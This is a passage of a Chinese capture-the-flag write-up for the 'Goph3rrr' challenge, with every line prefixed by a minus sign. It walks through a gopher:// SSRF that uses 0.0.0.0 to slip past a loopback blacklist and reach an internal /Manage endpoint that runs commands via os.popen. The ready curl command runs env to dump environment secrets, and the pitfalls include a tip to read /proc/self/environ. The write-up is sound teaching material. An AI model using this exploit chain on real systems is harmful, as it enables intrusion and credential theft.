-</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"gopher://0.0.0.0:8000/_"</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">req</span><span class="p">))</span>
-</span></code></pre></div>
-<p><strong><code>quote()</code> 会把 <code>\r\n</code> 编码成 <code>%0D%0A</code>、空格编码成 <code>%20</code>，你只管把报文写对。</strong></p>
-<h4 id="step-7"><a class="toclink" href="ghctf2025-goph3rrr/#step-7">Step 7：打出去</a></h4>
-<p><strong>curl 这边用 <code>-G --data-urlencode</code>，让命令帮忙做一次编码：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"gopher://0.0.0.0:8000/_POST%20/Manage%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Acmd%3Dls%20/"</span> <span class="s2">"http://node6.anna.nssnode.cn:24267/Gopher"</span>
-</span></code></pre></div>
-<p><strong>三个参数各管一件事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>-s                静默模式：不打印进度条和错误信息
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>-G                把后面 --data 的内容拼到 URL 的 query 上，而不是发 body
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>--data-urlencode  对内容做 URL 编码后再拼（等价于 ?url=&lt;编码后的值&gt;）
-</span></code></pre></div>
-<p><strong>等价于：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>GET /Gopher?url=gopher%3A%2F%2F0.0.0.0%3A8000%2F_...
-</span></code></pre></div>
-<h4 id="step-8-ls"><a class="toclink" href="ghctf2025-goph3rrr/#step-8-ls">Step 8：先 <code>ls</code>，再去环境变量里找</a></h4>
-<p><strong>第一次 <code>cmd=ls /</code>，根目录里没有 flag。</strong></p>
-<p><strong>那就看环境变量——把 body 换成 <code>cmd=env</code>：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">body</span> <span class="o">=</span> <span class="s2">"cmd=env"</span>
-</span></code></pre></div>
-<p><strong>flag 直接躺在环境变量里：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}
-</span></code></pre></div>
-<hr />
-<table>
-<thead>
-<tr>
-<th>关键点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>/Manage</code></td>
-<td>来源必须是 127.0.0.1、方法必须是 POST、<code>cmd</code> 直接进 <code>os.popen</code></td>
-</tr>
-<tr>
-<td><code>/Gopher</code></td>
-<td>服务器用 <code>curl</code> 请求你给的 url → curl 支持 gopher → 可发任意 TCP 报文</td>
-</tr>
-<tr>
-<td>黑名单</td>
-<td>按 <code>gethostbyname(hostname)</code> 判，<code>127.0.0.1</code> 大概率在里面</td>
-</tr>
-<tr>
-<td><code>0.0.0.0</code></td>
-<td>连它等于连本机，但不在黑名单里 → 绕过同时拿到 127.0.0.1 来源</td>
-</tr>
-<tr>
-<td>gopher 语法</td>
-<td><code>gopher://host:port/_&lt;data&gt;</code>，<code>_</code> 之后就是原样发送的字节</td>
-</tr>
-<tr>
-<td>报文三要素</td>
-<td>CRLF 行尾、头部后空行、Content-Length 与 body 字节数一致</td>
-</tr>
-<tr>
-<td><code>junkcode</code></td>
-<td>作者自己标注的干扰路由，看到就跳过</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>完整请求</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>GET /Gopher?url=&lt;urlencode(gopher://0.0.0.0:8000/_&lt;urlencode(HTTP报文)&gt;)&gt;
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>内层报文：
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>POST /Manage HTTP/1.1\r\n
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>Host: 127.0.0.1:8000\r\n
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>Content-Type: application/x-www-form-urlencoded\r\n
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>Content-Length: 8\r\n
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>\r\n
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>cmd=env
-</span></code></pre></div>
-</details>
-<details class="note">
-<summary>这题踩的坑</summary>
-<p><strong>① 用 <code>127.0.0.1</code> 打 gopher</strong></p>
-<p>会被黑名单直接挡住。<strong>回环地址永远是第一个被写进黑名单的。</strong></p>
-<p><strong>② <code>Content-Length</code> 写错</strong></p>
-<p>它必须等于 body 的字节数（<code>cmd=ls /</code> 是 8）。<strong>写错的话服务端会按错误的长度截断 body，<code>cmd</code> 参数就取不到了。</strong></p>
-<p><strong>③ 漏掉头部后的空行</strong></p>
-<p><code>\r\n\r\n</code> 少一个，服务端会认为请求头还没结束，一直等——表现为超时或 400。</p>
-<p><strong>④ 手写 <code>%0D%0A</code></strong></p>
-<p>一条报文里六处，手写基本必错。<strong>用 <code>urllib.parse.quote()</code> 生成。</strong></p>
-<p><strong>⑤ 只 <code>ls</code> 根目录</strong></p>
-<p>根目录没有不代表没有。<strong><code>env</code>、<code>/proc/self/environ</code>、应用目录都值得看一眼。</strong></p>
 </details>
     
     
